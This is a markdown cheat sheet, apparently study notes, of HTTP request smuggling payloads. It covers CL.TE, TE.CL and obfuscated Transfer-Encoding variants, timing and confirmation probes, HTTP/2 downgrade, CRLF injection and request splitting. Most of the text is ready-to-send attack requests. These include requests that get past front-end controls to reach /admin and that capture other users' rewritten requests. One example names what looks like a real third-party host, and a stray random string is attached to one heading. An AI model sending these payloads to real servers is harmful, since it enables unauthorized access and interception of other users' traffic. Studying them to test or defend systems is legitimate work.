## **CL.TE vulnerabilities**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 21
Transfer-Encoding: chunked

0

SMUGGLED-REQUEST
```

## **TE.CL vulnerabilities**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

10
SMUGGLED-REQUEST
0


```

## **TE.TE vulnerabilities**

Obfuscate the Transfer-Encoding header

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## **Finding HTTP request smuggling vulnerabilities**

### **Timing techniques**

If an application is vulnerable to the request smuggling, then sending a request like the following will often cause a time delay

- CL.TE

    ```
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 4

    1
    A
    X
    ```
- TE.CL

    ```
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Transfer-Encoding: chunked
    Content-Length: 6

    0

    X
    ```

### **Comfirming vulnerabilities**

- CL.TE

    ```
    POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 49
    Transfer-Encoding: chunked

    e
    q=smuggling&x=
    0

    GET /404 HTTP/1.1
    Foo: x
    ```

- TE.CLVXWbnvUGsVtZlAYPbyadue5eMuHUsCGb

    ```
    POST /search HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked

    7c
    GET /404 HTTP/1.1
    Host: vulnerable-website.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 144

    x=
    0


    ```

If the attack is successful, the server will respond with status code 404 when sending a next normal request, indicating that the attack request did indeed interfere with it

## **Exploiting HTTP request smuggling vulnerabilities**

### **Bypass front-end security controls**

If the front-end server is implement access control restrictions and the back-end server is not doing further checking, then it may be possible to bypass the access control restrictions by smuggling a request to the back-end server

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

### **Revealing front-end request rewriting**

In many applications, the front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.


```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=
```

## **HTTP/2 request smuggling**

### **HTTP/2 downgrading**  

HTTP/2 downgrading is the process of rewriting HTTP/2 requests using HTTP/1 syntax to generate an equivalent HTTP/1 request. Web servers and reverse proxies often do this in order to offer HTTP/2 support to clients while communicating with back-end servers that only speak HTTP/1

### **H2.CL vulnerabilities**

Front-end (HTTP/2)

<div style="text-align: justify">
:method	POST

:path	/example

:authority	vulnerable-website.com

content-type	application/x-www-form-urlencoded

content-length	0

</div>
GET /admin HTTP/1.1

Host: vulnerable-website.com

Content-Length: 10

x=1

Back-end (HTTP/1)

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1GET / H
```

### **H2.TE vulnerabilities**

Front-end (HTTP/2)
<div align='center'>

```
:method	POST
:path	/example
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
transfer-encoding	chunked
```

</div>

```
0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Back-end (HTTP/1)

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

### **Request smuggling via CRLF injection**

`Foo: bar\r\nTransfer-Encoding: chunked`
or `Foo: bar\nTransfer-Encoding: chunked`

### **HTTP/2 request splitting**

<div align='center'>

```
:method	GET
:path	/
:authority	vulnerable-website.com
foo	
bar\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable-website.com
```

</div>

### **Header name injection**

<div align='center'>

```
:method	POST
:path	/
:authority	ecosystem.atlassian.net
foo: bar
transfer-encoding	chunked
```

</div>

### **HTTP/2 request smuggling via HTTP/1 request smuggling**

```
POST /vulnerable-endpoint HTTP/1.1 Host: vulnerable-website.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 34 GET /hopefully404 HTTP/1.1 Foo: xGET / HTTP/1.1 Host: vulnerable-website.com
```
